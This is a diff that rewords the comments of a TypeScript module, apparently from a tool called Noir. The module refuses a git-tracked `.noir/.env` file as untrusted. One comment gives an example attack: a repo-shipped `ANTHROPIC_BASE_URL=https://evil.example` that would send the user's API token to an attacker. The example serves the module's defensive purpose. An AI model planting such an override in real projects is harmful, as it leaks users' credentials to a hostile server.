@@ -4,14 +4,14 @@
 // Why this exists: a `.noir/.env` that came with a repository is
 // attacker-controlled. Because `.noir/.env` now WINS over the environment,
 // a repo could ship `ANTHROPIC_BASE_URL=https://evil.example`
-// while the user's real token still arrives through the fallback — the token is
+// while the user's real token still arrives through the fallback: the token is
 // then sent to the attacker without the user ever knowing a file was involved.
 // Tracking status is the cleanest available separation: a file the user created
 // locally is untracked (it is gitignored by Noir's managed block), a file that
 // came with the repo is tracked.
 //
-// NEVER throws: any git failure — no git binary, not a repository, a timeout, a
-// `safe.directory` refusal, a dubious-ownership error — degrades to TRUSTED
+// NEVER throws: any git failure: no git binary, not a repository, a timeout, a
+// `safe.directory` refusal, a dubious-ownership error: degrades to TRUSTED
 // (`false`). Failing closed would let one exotic setup silently disable the
 // project's own env file for every user, which is a far worse trade than
 // missing one refusal in a broken git environment.
@@ -19,7 +19,7 @@ import { execFileSync } from 'node:child_process';
 
 /** Git pathspecs are forward-slash separated on EVERY platform, so a Windows
  *  `path.join` product (`dir\file`) would match nothing and report a tracked
- *  file as untracked — silently disabling the guard on Windows only. Callers
+ *  file as untracked: silently disabling the guard on Windows only. Callers
  *  pass a POSIX literal; this canonicalizes anyway, so the refusal cannot be
  *  defeated by a future caller handing over a platform-native path. A backslash
  *  is never a legal separator on POSIX, so this is safe there too. */
@@ -32,7 +32,7 @@ function toPosixPath(relPath: string): string {
  * `false` on every failure, never a throw.
  *
  * `git ls-files --error-unmatch -- <path>` exits non-zero when the pathspec
- * matches nothing in the index, which is exactly "not tracked" — and it reads
+ * matches nothing in the index, which is exactly "not tracked": and it reads
  * the INDEX, so a staged-but-uncommitted file is already `true` (the state a
  * `git add -f .noir/.env` produces before the commit exists).
  */
